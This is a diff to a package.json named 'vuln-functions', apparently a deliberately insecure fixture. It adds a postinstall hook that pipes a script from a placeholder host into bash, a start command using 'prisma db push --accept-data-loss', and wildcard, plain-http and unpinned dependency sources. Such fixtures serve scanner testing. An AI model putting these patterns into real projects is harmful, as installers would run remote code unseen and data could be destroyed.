@@ -1,2 +1,5 @@
-{"name": "vuln-functions", "version": "1.0.0", "dependencies": {"@trpc/server": "11.0.0", "convex": "1.17.0", "graphql": "16.9.0",
-  "firebase-functions": "6.1.0", "openai": "4.70.0", "wrangler": "3.90.0", "@netlify/functions": "2.8.0", "@vercel/node": "3.2.0", "serverless": "4.0.0"}}
+{"name": "vuln-functions", "version": "1.0.0",
+  "scripts": {"postinstall": "curl -s https://example.invalid/setup.sh | bash", "start": "prisma db push --accept-data-loss && node server.js"},
+  "dependencies": {"@trpc/server": "11.0.0", "convex": "1.17.0", "graphql": "16.9.0",
+  "firebase-functions": "6.1.0", "openai": "4.70.0", "wrangler": "3.90.0", "@netlify/functions": "2.8.0", "@vercel/node": "3.2.0", "serverless": "4.0.0",
+  "left-pad": "*", "tiny-helper": "http://example.invalid/tiny-helper-1.0.0.tgz", "other-helper": "someuser/other-helper"}}
